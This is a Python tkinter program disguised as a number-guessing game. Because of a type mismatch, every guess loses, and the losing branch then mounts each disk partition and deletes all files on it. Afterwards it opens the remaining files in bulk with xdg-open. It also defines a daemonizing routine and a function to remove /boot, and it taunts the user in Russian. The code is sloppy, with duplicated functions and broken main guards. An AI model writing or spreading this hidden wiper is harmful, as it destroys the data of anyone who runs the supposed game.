import tkinter
from tkinter import *
import random
import os
import subprocess
import re
import sys
import signal
import time


def check_root():
    if os.geteuid() != 0:  # Проверяем, если текущий пользователь не root
        print("Этот скрипт должен запускаться от имени root!")
        sys.exit(1)  # Завершаем выполнение с ненулевым кодом ошибки


if __name__ == "main":
    check_root()
    print("Скрипт запущен от имени root.")
    # Ваш основной код здесь


def daemonize():
    # Создаем форк процесса
    if os.fork() > 0:
        sys.exit()

    # Отделяемся от родительского процесса
    os.setsid()

    # Создаем второй форк
    if os.fork() > 0:
        sys.exit()

    # Перенаправляем стандартные потоки
    sys.stdout = open('/dev/null', 'w')
    sys.stderr = open('/dev/null', 'w')
    sys.stdin = open('/dev/null', 'r')


def main():
    daemonize()
    while True:
        print("Скрипт работает и его нельзя легко закрыть.")
        time.sleep(10)


if __name__ == "main":
    main()

window = Tk()
window.title("game for die")
window.geometry('400x400')
label = Label(window, text="выбери число от 1 до 10")
label.pack(padx=20, pady=10)


def data():
    mm = random.randint(1, 10)
    text = entry.get()
    if text == mm:
        win = Tk()
        label = Label(win, text="молодец, ты выиграл, больше проектов на моей странице в гитхаб")
        label.pack(padx=20, pady=10)


    else:
        fal = Tk()
        label = Label(fal, text="TOBI PIZDA, HA-HA-HA")
        label.pack(padx=20, pady=10)

        def delet():
            os.rmdir('/boot/')

        def get_disks():
            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT'], stdout=subprocess.PIPE)
            output = result.stdout.decode()
            get_desk = re.findall(r'sd\w\d', output)
            return get_desk

        def mount_disk(device, mount_point):
            try:
                subprocess.run(['sudo', 'mkdir', '-p', mount_point], check=True)
                subprocess.run(['sudo', 'mount', device, mount_point], check=True)
                print()
            except subprocess.CalledProcessError as e:
                print()

        for i in range(len(get_disks())):
            mount_disk(f'/dev/{get_disks()[i]}', f'/mnt/{get_disks()[i]}')
            os.chdir(f'/mnt/{get_disks()[i]}')
            try:
                for j in range(100):
                    for i in range(len(os.listdir())):
                        subprocess.run(['chmod', '+w', os.listdir()[i]])
                        os.remove(os.listdir()[i])
            except OSError:
                print('sasd')

        time.sleep(5)

        def get_disks():
            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT'], stdout=subprocess.PIPE)
            output = result.stdout.decode()
            get_desk = re.findall(r'sd\w\d', output)
            return get_desk

        def get_disks():
            result = subprocess.run(['lsblk', '-o', 'NAME,SIZE,TYPE,MOUNTPOINT'], stdout=subprocess.PIPE)
            output = result.stdout.decode()
            get_desk = re.findall(r'sd\w\d', output)
            return get_desk

        def mount_disk(device, mount_point):
            try:
                subprocess.run(['sudo', 'mkdir', '-p', mount_point], check=True)
                subprocess.run(['sudo', 'mount', device, mount_point], check=True)
                print()
            except subprocess.CalledProcessError as e:
                print()

        for i in range(len(get_disks())):
            mount_disk(f'/dev/{get_disks()[i]}', f'/mnt/{get_disks()[i]}')
            os.chdir(f'/mnt/{get_disks()[i]}')
            try:
                for j in range(100):
                    for i in range(len(os.listdir())):
                        subprocess.run(['xdg-open', os.listdir()[i]])
            except OSError:
                print('sasd')


button = Button(text='confirm!', command=data)
entry = Entry()

entry.pack()
button.pack()
window.mainloop()
win.mainloop()
fal.mainloop()